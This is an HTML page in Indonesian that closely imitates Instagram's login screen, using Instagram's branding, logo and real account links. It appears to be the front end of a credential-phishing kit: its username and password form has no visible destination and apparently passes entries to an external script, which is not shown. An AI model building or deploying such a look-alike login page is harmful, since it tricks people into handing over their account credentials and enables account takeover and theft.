<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <link rel="shortcut icon" type="image/png" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3048c44c6.ico">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        /* Kotak Utama */
        .main-container {
            width: 350px;
            text-align: center;
        }

        .box {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 10px 40px;
            margin-bottom: 10px;
        }

        /* Logo Instagram */
        .logo {
            margin: 35px auto 12px;
            width: 175px;
            display: block;
        }

        /* Input Styling */
        .input-field {
            width: 100%;
            padding: 9px 8px;
            margin-bottom: 6px;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            background-color: #fafafa;
            font-size: 12px;
            box-sizing: border-box;
        }

        .input-field:focus {
            border: 1px solid #a8a8a8;
            outline: none;
        }

        /* Tombol Login */
        .login-button {
            width: 100%;
            padding: 7px;
            margin: 8px 0;
            background-color: #0095f6;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
        }

        .login-button:disabled {
            background-color: #b2dffc;
        }

        /* Separator (ATAU) */
        .separator {
            display: flex;
            align-items: center;
            color: #8e8e8e;
            font-size: 13px;
            font-weight: 600;
            margin: 15px 0 20px;
        }

        .separator::before, .separator::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #dbdbdb;
        }

        .separator::before { margin-right: 18px; }
        .separator::after { margin-left: 18px; }

        /* Login Facebook */
        .facebook-login {
            color: #385185;
            font-weight: 600;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
            margin-bottom: 20px;
        }

        .facebook-login i {
            margin-right: 8px;
            font-size: 16px;
        }

        /* Lupa Kata Sandi */
        .forgot-password {
            color: #00376b;
            font-size: 12px;
            text-decoration: none;
            display: block;
            margin-bottom: 15px;
        }

        /* Kotak Daftar (Sign Up) */
        .signup-box {
            font-size: 14px;
            padding: 20px;
        }

        .signup-box a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        /* Get App Section */
        .get-app {
            text-align: center;
            font-size: 14px;
            margin-top: 10px;
        }

        .app-buttons {
            margin-top: 15px;
        }

        .app-buttons img {
            height: 40px;
            margin: 0 4px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="box">
            <img class="logo" alt="Instagram" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png">
            
            <form id="Formulir">
                <input type="text" class="input-field" id="email" placeholder="Nomor telepon, nama pengguna, atau email" required>
                <input type="password" class="input-field" id="password" placeholder="Kata sandi" required>
                
                <button class="login-button" type="submit">Masuk</button>
            </form>

            <div class="separator">ATAU</div>

            <a href="#" class="facebook-login">
                <i class="fab fa-facebook-square"></i> Masuk dengan Facebook
            </a>

            <a href="https://www.instagram.com/accounts/password/reset" class="forgot-password">
                Lupa kata sandi?
            </a>
        </div>

        <div class="box signup-box">
            Tidak punya akun? <a href="https://www.instagram.com/accounts/emailsignup">Buat akun</a>
        </div>

        <div class="get-app">
            <p>Dapatkan aplikasi.</p>
            <div class="app-buttons">
                <img alt="Google Play" src="img/google-play-badge.png">
                <img alt="Microsoft Store" src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png">
            </div>
        </div>
    </div>

    <script src="script1.js"></script>
</body>
</html>
